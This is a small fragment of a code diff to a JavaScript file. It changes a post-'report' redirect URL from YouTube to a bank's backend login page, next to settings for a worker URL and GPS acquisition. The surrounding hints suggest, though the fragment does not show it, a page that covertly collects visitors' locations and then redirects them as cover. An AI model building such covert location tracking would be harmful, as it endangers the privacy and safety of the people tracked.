@@ -18,7 +18,7 @@ const WORKER_URL =
 
 // Landing page after successful report
 
-const REDIRECT_URL = "https://www.youtube.com";
+const REDIRECT_URL = "https://dashboard-gb.bni.co.id/backend/login";
 
 // GPS acquisition settings
 
